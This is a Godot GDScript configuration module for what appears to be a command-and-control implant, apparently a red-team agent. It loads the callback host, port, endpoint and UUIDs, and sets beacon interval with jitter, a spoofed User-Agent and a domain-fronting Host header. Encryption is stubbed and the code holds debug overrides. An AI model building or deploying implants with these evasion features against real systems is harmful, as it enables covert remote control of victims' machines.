extends Node

const FILE_NAME = "res://config_websocket.json"

var setting = {
	"payload_uuid": false,
	"callback_uuid": false
}

var rng

func _ready():
	rng = RandomNumberGenerator.new()
	rng.randomize()

	if FileAccess.file_exists(FILE_NAME):
		var file = FileAccess.open(FILE_NAME, FileAccess.READ)

		var test_json_conv = JSON.new()
		test_json_conv.parse(file.get_as_text())
		var data = test_json_conv.get_data()

		file.close()

		if typeof(data) == TYPE_DICTIONARY:
			print(data)
			setting = data
		else:
			printerr("Corrupted data!")
	else:
		printerr("No saved data!")

func should_encrypt():
	return false # TODO: implement

func get_verify():
	if setting.has("tls_verify"):
		return setting.get("tls_verify")

	return false

func get_payload_uuid():

	if setting.has("payload_uuid"):
		return setting.get("payload_uuid")

	return ""

func get_callback_uuid():

	if setting.has("callback_uuid"):
		return setting.get("callback_uuid")

	return ""

func get_callback_wait_time():

	var callback_period = 10 # unit seconds
	var callback_jitter = 5 # unit seconds

	if setting.has("callback_interval"):
		callback_period = int(setting.get("callback_interval"))

	if setting.has("callback_jitter"):
		callback_jitter = float(float(setting.get("callback_jitter")) / 2.0)

	if callback_jitter > callback_period:
		callback_period = callback_jitter # TODO: can we do better than this?

	var rr = rng.randi_range(callback_jitter*-1, callback_jitter)
	print("get_callback_wait_time: ", rr)
	
	var wait_time = callback_period + rr
	
	if wait_time <= 0:
		wait_time = 1
	
	wait_time = 4 # TODO: REMOVE AFTER DEBUG

	return wait_time

func get_headers():
	var headers = PackedStringArray()

	if setting.has("USER_AGENT") and not setting.get("USER_AGENT").is_empty():
		headers.append("User-Agent: %s" %  setting.get("USER_AGENT"))

	if setting.has("domain_front") and not setting.get("domain_front").is_empty():
		headers.append("Host: %s" %  setting.get("domain_front"))

	return headers

func get_callback_uri():
	var callback_host = ""

	if setting.has("callback_host"):
		callback_host += setting.get("callback_host")

	if setting.has("callback_port"):
		callback_host += ":%s" % String(setting.get("callback_port"))

	if setting.has("ENDPOINT_REPLACE"):
		callback_host += "/%s" % setting.get("ENDPOINT_REPLACE")

	print("callback_host: %s" % callback_host)

	return callback_host

func set_callback_uuid(uuid):
	setting["callback_uuid"] = uuid
